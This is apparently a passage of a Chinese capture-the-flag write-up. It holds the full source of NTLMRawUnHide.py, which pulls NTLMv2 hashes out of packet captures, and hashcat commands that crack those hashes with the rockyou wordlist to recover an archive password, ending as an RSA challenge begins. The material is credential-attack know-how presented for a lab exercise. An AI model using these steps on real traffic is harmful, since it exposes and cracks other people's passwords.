f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># All the magic happens in searchCaptureFile()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">searchCaptureFile</span>(<span class="params">infile, outfile, verbose, follow, quiet, offset=<span class="number">0</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Variable initialization</span></span><br><span class="line">    server_challenge = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># NTLMSSP message signatures</span></span><br><span class="line">    ntlmssp_sig = <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00&quot;</span>  <span class="comment"># NTLMSSP\x00</span></span><br><span class="line">    ntlmssp_type_1 = (</span><br><span class="line">        <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00&quot;</span>  <span class="comment"># NTLMSSP\x00 0x01000000</span></span><br><span class="line">    )</span><br><span class="line">    ntlmssp_type_2 = (</span><br><span class="line">        <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00\x02\x00\x00\x00&quot;</span>  <span class="comment"># NTLMSSP\x00 0x02000000</span></span><br><span class="line">    )</span><br><span class="line">    ntlmssp_type_3 = (</span><br><span class="line">        <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00\x03\x00\x00\x00&quot;</span>  <span class="comment"># NTLMSSP\x00 0x03000000</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read binary file data</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(infile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        readbuff = fp.read()</span><br><span class="line">        last_byte = <span class="built_in">len</span>(readbuff)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fp.seek(offset,0)</span></span><br><span class="line">        fp.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        readbuff = fp.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read bytes until the end of the file</span></span><br><span class="line">    <span class="keyword">while</span> offset != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># print(&quot;Current scan offset:&quot;,offset)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># increment file offset past occurance of ntlm_sig unless start of file</span></span><br><span class="line">        <span class="keyword">if</span> offset != <span class="number">0</span>:</span><br><span class="line">            offset = offset + <span class="built_in">len</span>(ntlmssp_sig)</span><br><span class="line"></span><br><span class="line">        offset = readbuff.find(ntlmssp_sig, offset)</span><br><span class="line"></span><br><span class="line">        <span class="comment">### Check for NTLMSSP Message type(s)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># NTLMSSP Message Type 1: Negotiation</span></span><br><span class="line">        check_ntlm_type = readbuff.find(</span><br><span class="line">            ntlmssp_type_1, offset, offset + <span class="built_in">len</span>(ntlmssp_type_1)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> check_ntlm_type &gt; -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 1 :\033[1;32m Negotiation\033[0;37m    \033[1;30m&gt;\033[0;37m Offset&quot;</span>,</span><br><span class="line">                        offset,</span><br><span class="line">                        <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 1 :\033[1;32m Negotiation\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NTLMSSP Message Type 2: Challenge</span></span><br><span class="line">        check_ntlm_type = readbuff.find(</span><br><span class="line">            ntlmssp_type_2, offset, offset + <span class="built_in">len</span>(ntlmssp_type_2)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> check_ntlm_type &gt; -<span class="number">1</span>:</span><br><span class="line">            server_challenge = readbuff[(offset + <span class="number">24</span>) : (offset + <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 2 :\033[1;32m Challenge      \033[1;30m&gt;\033[0;37m Offset&quot;</span>,</span><br><span class="line">                        offset,</span><br><span class="line">                        <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 2 :\033[1;32m Challenge\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Server Challenge       :\033[0;97m&quot;</span>,</span><br><span class="line">                    server_challenge.<span class="built_in">hex</span>(),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NTLMSSP Message Type 3: Authentication</span></span><br><span class="line">        check_ntlm_type = readbuff.find(</span><br><span class="line">            ntlmssp_type_3, offset, offset + <span class="built_in">len</span>(ntlmssp_type_3)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> check_ntlm_type &gt; -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 3 :\033[1;32m Authentication \033[1;30m&gt;\033[0;37m Offset&quot;</span>,</span><br><span class="line">                        offset,</span><br><span class="line">                        <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 3 :\033[1;32m Authentication\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find domain</span></span><br><span class="line">            domain_length_raw = readbuff[(offset + <span class="number">28</span>) : (offset + <span class="number">28</span> + <span class="number">2</span>)]</span><br><span class="line">            domain_length = decode_int(domain_length_raw)</span><br><span class="line"></span><br><span class="line">            domain_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">28</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">28</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            domain_offset = decode_int(domain_offset_raw)</span><br><span class="line"></span><br><span class="line">            domain = readbuff[</span><br><span class="line">                (offset + domain_offset) : (offset + domain_offset + domain_length)</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Domain                 :\033[0;97m&quot;</span>,</span><br><span class="line">                    decode_string(domain),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Domain length          :&quot;</span>, domain_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Domain offset          :&quot;</span>, domain_offset)</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find username</span></span><br><span class="line">            username_length_raw = readbuff[(offset + <span class="number">36</span>) : (offset + <span class="number">36</span> + <span class="number">2</span>)]</span><br><span class="line">            username_length = decode_int(username_length_raw)</span><br><span class="line"></span><br><span class="line">            username_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">36</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">36</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            username_offset = decode_int(username_offset_raw)</span><br><span class="line"></span><br><span class="line">            username = readbuff[</span><br><span class="line">                (offset + username_offset) : (</span><br><span class="line">                    offset + username_offset + username_length</span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Username               :\033[0;97m&quot;</span>,</span><br><span class="line">                    decode_string(username),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Username length        :&quot;</span>, username_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Username offset        :&quot;</span>, username_offset)</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find workstation</span></span><br><span class="line">            workstation_length_raw = readbuff[(offset + <span class="number">44</span>) : (offset + <span class="number">44</span> + <span class="number">2</span>)]</span><br><span class="line">            workstation_length = decode_int(workstation_length_raw)</span><br><span class="line"></span><br><span class="line">            workstation_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">44</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">44</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            workstation_offset = decode_int(workstation_offset_raw)</span><br><span class="line"></span><br><span class="line">            workstation = readbuff[</span><br><span class="line">                (offset + workstation_offset) : (</span><br><span class="line">                    offset + workstation_offset + workstation_length</span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Workstation            :\033[0;97m&quot;</span>,</span><br><span class="line">                    decode_string(workstation),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Workstation length     :&quot;</span>, workstation_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Workstation offset     :&quot;</span>, workstation_offset)</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find NTLM response</span></span><br><span class="line">            ntlm_length_raw = readbuff[(offset + <span class="number">20</span>) : (offset + <span class="number">20</span> + <span class="number">2</span>)]</span><br><span class="line">            ntlm_length = decode_int(ntlm_length_raw)</span><br><span class="line"></span><br><span class="line">            ntlm_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">20</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">20</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            ntlm_offset = decode_int(ntlm_offset_raw)</span><br><span class="line"></span><br><span class="line">            ntproofstr = readbuff[(offset + ntlm_offset) : (offset + ntlm_offset + <span class="number">16</span>)]</span><br><span class="line">            ntlmv2_response = readbuff[</span><br><span class="line">                (offset + ntlm_offset + <span class="number">16</span>) : (offset + ntlm_offset + ntlm_length)</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      NTLM length            :&quot;</span>, ntlm_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      NTLM offset            :&quot;</span>, ntlm_offset)</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;    \033[1;34m&gt;\033[1;37m NTProofStr             :\033[0;37m&quot;</span>,</span><br><span class="line">                        ntproofstr.<span class="built_in">hex</span>(),</span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;    \033[1;34m&gt;\033[1;37m NTLMv2 Response        :\033[0;37m&quot;</span>,</span><br><span class="line">                        ntlmv2_response.<span class="built_in">hex</span>(),</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Prepare NTLMv2 Hash for output</span></span><br><span class="line">            <span class="keyword">if</span> server_challenge != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;\033[1;37mNTLMv2 Hash recovered:\033[0;97m&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ntlm_length == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">&quot;\033[0;37mNTLM NULL session found... no hash to generate\033[0;37m&quot;</span></span><br><span class="line">                        )</span><br><span class="line">                <span class="keyword">elif</span> domain_length == <span class="number">0</span>:</span><br><span class="line">                    hash_out = (</span><br><span class="line">                        decode_string(username)</span><br><span class="line">                        + <span class="string">&quot;::&quot;</span></span><br><span class="line">                        + decode_string(workstation)</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + server_challenge.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntproofstr.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntlmv2_response.<span class="built_in">hex</span>()</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(hash_out)</span><br><span class="line">                    <span class="keyword">if</span> outfile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        writeOutfile(outfile, hash_out)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hash_out = (</span><br><span class="line">                        decode_string(username)</span><br><span class="line">                        + <span class="string">&quot;::&quot;</span></span><br><span class="line">                        + decode_string(domain)</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + server_challenge.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntproofstr.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntlmv2_response.<span class="built_in">hex</span>()</span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>(hash_out)</span><br><span class="line">                    <span class="keyword">if</span> outfile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        writeOutfile(outfile, hash_out)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Reset variable</span></span><br><span class="line">                server_challenge = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;31mServer Challenge not found... can&#x27;t create crackable hash :-/\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Continue forever if follow is set, until ctrl-c</span></span><br><span class="line">    <span class="keyword">if</span> follow == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            searchCaptureFile(infile, outfile, verbose, follow, quiet, last_byte)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="comment"># Gracefully exit on ctrl-c</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Can a tool be a tool without ASCII Art?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="comment"># Start yellow</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;93m                                                              /%(&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                               -= Find NTLMv2 =-          ,@@@@@@@@&amp;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;           /%&amp;@@@@&amp;,            -= hashes w/ =-          %@@@@@@@@@@@*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;         (@@@@@@@@@@@(       -= NTLMRawUnHide.py =-    *@@@@@@@@@@@@@@@.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;        &amp;@@@@@@@@@@@@@@&amp;.                             @@@@@@@@@@@@@@@@@@(&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;      ,@@@@@@@@@@@@@@@@@@@/                        .%@@@@@@@@@@@@@@@@@@@@@&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;     /@@@@@@@#&amp;@&amp;*.,/@@@@(.                            ,%@@@@&amp;##(%@@@@@@@@@.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;    (@@@@@@@(##(.         .#&amp;@%%(                .&amp;&amp;@@&amp;(            ,/@@@@@@#&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;   %@@@@@@&amp;*/((.         #(                           ,(@&amp;            ,%@@@@@@*&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;  @@@@@@@&amp;,/(*                                           ,             .,&amp;@@@@@#&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot; @@@@@@@/*//,                                                            .,,,**&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   .,,  ...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                    .#@@@@@@@(.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                   /@@@@@@@@@@@&amp;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                   .@@@@@@@@@@@*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                     .(&amp;@@@%/.  ..&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                               (@@&amp;     %@@.   .@@@,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                          /@@#          @@@,         %@&amp;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                               &amp;@@&amp;.    @@@/    @@@#&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                          .    %@@@(   ,@@@#    @@@(     ,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                         *@@/         .@@@@@(          #@%&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                          *@@%.      &amp;@@@@@@@@,      /@@@.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                           .@@@@@@@@@@@&amp;. .*@@@@@@@@@@@/.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                              .%@@@@%,        /%@@@&amp;(.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="comment"># Regular white text</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;97m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Print basic usage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="comment"># Bold white text</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[1;37m&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;usage: NTLMRawUnHide.py -i &lt;inputfile&gt; [-o &lt;outputfile&gt;] [-f] [-h] [-q] [-v]&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># Regular white text</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;97m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display verbose help</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showhelp</span>():</span><br><span class="line">    usage()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Main options:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  -f, --follow               Continuously &quot;follow&quot; (e.g. &quot;read from&quot;)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             input file for new data&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -h, --help&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -i, --input  &lt;inputfile&gt;   Binary packet data input file&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             (.pcap, .pcapng, .cap, .etl, others?)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -o, --output &lt;outputfile&gt;  Output file to record any found NTLM&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             hashes&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -q, --quiet                Be a lot more quiet and only output&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             found NTLM hashes. --quiet will also&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             disable verbose, if specified.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -v, --verbose&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check to see if command line args were sent</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> argv:</span><br><span class="line">        banner()</span><br><span class="line">        usage()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Default option values</span></span><br><span class="line">    infile = <span class="string">&quot;&quot;</span></span><br><span class="line">    outfile = <span class="string">&quot;&quot;</span></span><br><span class="line">    verbose = <span class="literal">False</span></span><br><span class="line">    follow = <span class="literal">False</span></span><br><span class="line">    quiet = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Process command line args</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(</span><br><span class="line">            argv, <span class="string">&quot;hvqfi:o:&quot;</span>, [<span class="string">&quot;input=&quot;</span>, <span class="string">&quot;output=&quot;</span>, <span class="string">&quot;verbose&quot;</span>, <span class="string">&quot;follow&quot;</span>, <span class="string">&quot;quiet&quot;</span>]</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError:</span><br><span class="line">        usage()</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> opt, arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">&quot;-h&quot;</span>, <span class="string">&quot;--help&quot;</span>):</span><br><span class="line">            banner()</span><br><span class="line">            showhelp()</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--input&quot;</span>):</span><br><span class="line">            infile = arg</span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>):</span><br><span class="line">            outfile = arg</span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--follow&quot;</span>):</span><br><span class="line">            follow = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--verbose&quot;</span>):</span><br><span class="line">            verbose = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-q&quot;</span>, <span class="string">&quot;--quiet&quot;</span>):</span><br><span class="line">            quiet = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            usage()</span><br><span class="line">            sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check to make sure input file is specified</span></span><br><span class="line">    <span class="keyword">if</span> infile == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;\033[1;31m[!]\033[0;97m Error: Input file not specified.  Did you mean to specify -i?&quot;</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check to make sure input file exists</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(infile) == <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m[!]\033[0;97m Error: Input file not found.&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> quiet == <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># Ensure we will be quiet</span></span><br><span class="line">        verbose = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        banner()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If infile is specified, get things kicked off</span></span><br><span class="line">    <span class="keyword">if</span> infile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="comment"># Bold white text</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[1;37mSearching&quot;</span>, infile, <span class="string">&quot;for NTLMv2 hashes...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> outfile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Writing output to:&quot;</span>, outfile)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Regular white text</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;97m&quot;</span>)</span><br><span class="line">        searchCaptureFile(infile, outfile, verbose, follow, quiet, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hashcat -m <span class="number">5600</span> starven.txt /tools/rockyou.txt</span><br><span class="line">hashcat -m <span class="number">5600</span> starven.txt /tools/rockyou.txt --show</span><br></pre></td></tr></table></figure><p>提取出密码为spellorstarve，即为压缩包的密码。</p><h1 id="Crypto">Crypto</h1><h2 id="RSA">RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = 